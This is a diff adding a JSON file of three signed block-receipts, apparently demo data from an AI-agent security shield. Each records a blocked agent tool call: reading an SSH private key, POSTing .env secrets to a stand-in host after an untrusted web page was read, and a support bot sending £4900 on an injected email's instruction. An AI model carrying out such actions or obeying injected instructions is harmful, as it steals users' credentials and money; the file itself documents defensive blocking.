@@ -1,0 +1,71 @@
+[
+  {
+    "type": "mastyf.block-receipt",
+    "version": 1,
+    "receipt_id": "d6174aee-5464-4620-80d2-71ae02fa879a",
+    "issued_at": "2026-11-20T09:14:03.000Z",
+    "agent": "claude-code",
+    "tool": "Read",
+    "arguments_sha256": "7538e13d62e193f89365f4e7bdb16fbd5fe06e4c69dc98c25143752202474773",
+    "arguments_preview": "{\"file_path\":\"~/.ssh/id_rsa\"}",
+    "decision": "block",
+    "layer": "policy",
+    "rule": "path-guard.ssh-private-key",
+    "reason": "Reading SSH private keys is not allowed by your policy.",
+    "policy_sha256": "217363c1eb771c40524d840777e2702efe5016266f4f364fe89976ff6ff5595a",
+    "shield_version": "demo",
+    "prev_receipt_sha256": null,
+    "signature": {
+      "alg": "Ed25519",
+      "key_id": "1f12c58abfdbbca1",
+      "public_key": "SEA7FunXx0j5KfFuo9qlQzIu1c4EmrVcmjeuLnc636g=",
+      "value": "lgzmPaAH1nn5ocMS3rEGG80/fm2C3mACEfgyG0s/Wxd/e8KfDTQ9Sv37fe+NpH8sII74IsNnbfakAsFhLKxzAg=="
+    }
+  },
+  {
+    "type": "mastyf.block-receipt",
+    "version": 1,
+    "receipt_id": "a7988a31-55cf-44ea-9f48-85b53636e8fe",
+    "issued_at": "2026-11-20T09:31:47.000Z",
+    "agent": "cursor",
+    "tool": "fetch",
+    "arguments_sha256": "213ac0550b9930c15ef04a49bece0db3f520ac904f2d23c9e5bae70dd3649df3",
+    "arguments_preview": "{\"url\":\"https://paste-drop.example/u/8f2k\",\"method\":\"POST\",\"body\":\"OPENAI_API_KEY=[REDACTED]\\nDATABASE_URL=[REDACTED]\"}",
+    "decision": "block",
+    "layer": "difc",
+    "rule": "difc.tainted-egress",
+    "reason": "Contents of the repo's .env file were about to be sent to an unknown address, right after the agent read an untrusted web page.",
+    "policy_sha256": "217363c1eb771c40524d840777e2702efe5016266f4f364fe89976ff6ff5595a",
+    "shield_version": "demo",
+    "prev_receipt_sha256": "0a94223afb5a1e11d74ad45738f75ba0a1cbdd9d71930c7dff9f7676eefd4fa7",
+    "signature": {
+      "alg": "Ed25519",
+      "key_id": "1f12c58abfdbbca1",
+      "public_key": "SEA7FunXx0j5KfFuo9qlQzIu1c4EmrVcmjeuLnc636g=",
+      "value": "WYAuSADuTz1q9t3FCo+RgPF2cs4e2SkV7B8bRPns6gPRqjLZ1HinvkMgj5OZ2tbbrh6m/Di2n/ewmBgGnBnmAA=="
+    }
+  },
+  {
+    "type": "mastyf.block-receipt",
+    "version": 1,
+    "receipt_id": "ce6a639b-649a-4c92-9906-83f2fb224448",
+    "issued_at": "2026-11-20T10:02:19.000Z",
+    "agent": "support-bot (custom agent)",
+    "tool": "transfer_funds",
+    "arguments_sha256": "f810ff705482fb357a2e3c260815e0ed260c51f5a9cd3cae5f4b63903d2d6423",
+    "arguments_preview": "{\"to_account\":\"GB29NWBK60161331926819\",\"amount\":4900,\"currency\":\"GBP\",\"memo\":\"urgent refund\"}",
+    "decision": "block",
+    "layer": "protocol-x",
+    "rule": "protocol-x.injected-instruction",
+    "reason": "An incoming support email told the agent to send money to an outside account. The user never asked for a transfer.",
+    "policy_sha256": "217363c1eb771c40524d840777e2702efe5016266f4f364fe89976ff6ff5595a",
+    "shield_version": "demo",
+    "prev_receipt_sha256": "26ab96616d6775ab11bc7695bcf2dae15c52230cf58e4b690854bc9c851714f8",
+    "signature": {
+      "alg": "Ed25519",
+      "key_id": "1f12c58abfdbbca1",
+      "public_key": "SEA7FunXx0j5KfFuo9qlQzIu1c4EmrVcmjeuLnc636g=",
+      "value": "JkGgwjz3h71yWCLFB7BllJFajgUNUWVVAtSqVUgB/MePv+RdWv0twCCYMhzXSIVJIKfuTPqXEajfQecTfWQDCw=="
+    }
+  }
+]
